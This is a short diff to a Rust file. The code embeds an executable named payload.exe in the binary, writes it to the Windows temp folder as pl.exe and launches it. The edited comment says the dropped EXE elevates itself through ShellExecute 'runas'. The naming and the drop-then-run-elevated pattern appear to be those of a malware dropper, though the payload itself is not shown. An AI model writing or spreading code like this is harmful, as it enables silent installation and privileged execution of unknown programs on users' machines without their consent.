@@ -3,7 +3,7 @@ use std::process::Command;
 
 const PAYLOAD_BYTES: &[u8] = include_bytes!("../payload.exe");
 
-/// Write the embedded EXE to %TEMP% and launch it.
+/// Write the embedded EXE to %TEMP% and launch it (EXE self-elevates via ShellExecute runas).
 pub fn deploy_and_launch() -> Result<(), String> {
     let tmp = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
     let path = PathBuf::from(&tmp).join("pl.exe");
